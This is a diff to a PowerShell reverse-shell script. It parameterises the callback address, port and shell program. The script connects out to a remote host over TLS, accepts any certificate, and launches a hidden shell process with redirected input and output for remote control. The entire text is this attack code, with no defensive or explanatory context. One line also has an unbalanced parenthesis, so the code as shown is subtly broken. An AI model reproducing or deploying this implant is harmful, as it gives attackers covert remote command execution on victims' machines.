@@ -1,11 +1,12 @@
-$socket = new-object net.sockets.tcpclient($a,$b)
-$tcpstream = $socket.getstream()
+param($address,$port,$shell)
+$tcpclient = new-object net.sockets.tcpclient($address,$port)
+$tcpstream = $tcpclient.getstream()
 $tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true}))
 $tlsstreamwriter = new-object io.streamwriter($tlsstream)
 $tlsstreamwriter.autoflush = $true
 $tlsstreamreader = new-object io.streamreader($tlsstream)
 $shellinfo = new-object diagnostics.processstartinfo
-$shellinfo.filename = "cmd.exe"
+$shellinfo.filename = $shell
 $shellinfo.createnowindow = $true
 $shellinfo.useshellexecute = $false
 $shellinfo.redirectstandardoutput = $true
